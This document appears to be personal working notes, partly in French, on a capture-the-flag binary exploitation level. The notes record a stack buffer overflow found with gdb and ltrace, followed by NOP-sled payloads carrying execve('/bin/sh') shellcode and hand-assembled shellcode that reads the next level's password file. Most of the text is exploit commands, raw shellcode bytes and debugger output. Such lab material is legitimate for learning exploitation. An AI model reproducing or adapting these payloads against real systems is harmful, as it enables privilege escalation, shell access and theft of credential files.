# level04

Pour l'instant
```
\x31\xc0\x50\x50\x50\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x8d\x44\x24\x22\x50\x8d\x44\x24\x1e\x50\x8d\x44\x24\x08\x50\x31\xc0\xb0\x05\xcd\x80
```

<!-- >>> "/home/users/level05/.pass"[::-1].encode("hex") -->

https://unix.stackexchange.com/questions/421750/where-do-you-find-the-syscall-table-for-linux

https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_32.tbl#L17

python -c 'print "A"*157' | ltrace -f ./level04 segv

155 does not segv

156 doubles

0x42424242

With gdb
set follow-fork-mode child

Et avec en entrée `python -c "print 'A'*(156) + 'B'*4"`

Après le gets on a la stack
```
x/100xw $esp
0xffffd650:     0xffffd670      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000b80      0x00000000      0xf7fdc714      0x00000000
0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd700:     0x41414141      0x41414141      0x41414141      0x42424242

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Notre payload ?
```
# 0xffffd670

\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

python -c "print '\x90'*(156 - 24) + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x70\xd6\xff\xff'"

python -c "print '\x90'*(156 - 24) + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x70\xd6\xff\xff'" | ltrace -f ./level04

(python -c "print '\x90'*(32) + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A'*(156-32-24) + '\x70\xd6\xff\xff'";) | ltrace -f ./level04

```

```
(python -c "print '\x90'*(156 - 80) + '\x31\xd2\x31\xc9\x8d\x1d\x33\x90\x04\x08\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x8d\x0c\x24\xba\x28\x00\x00\x00\x31\xc0\xb0\x03\xcd\x80\xbb\x01\x00\x00\x00\x8d\x0c\x24\xba\x28\x00\x00\x00\x31\xc0\xb0\x04\xcd\x80\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73\x00\x00\x00\x00' + '\x70\xd6\xff\xff'";) | ltrace -f ./level04
```

Len: 80
\x31\xd2\x31\xc9\x8d\x1d\x31\x90\x04\x08\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x89\xe1\xba\x28\x00\x00\x00\x31\xc0\xb0\x03\xcd\x80\xbb\x01\x00\x00\x00\x89\xe1\xba\x28\x00\x00\x00\x31\xc0\xb0\x04\xcd\x80\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73\x00\x00\x00\x00\x00\x00
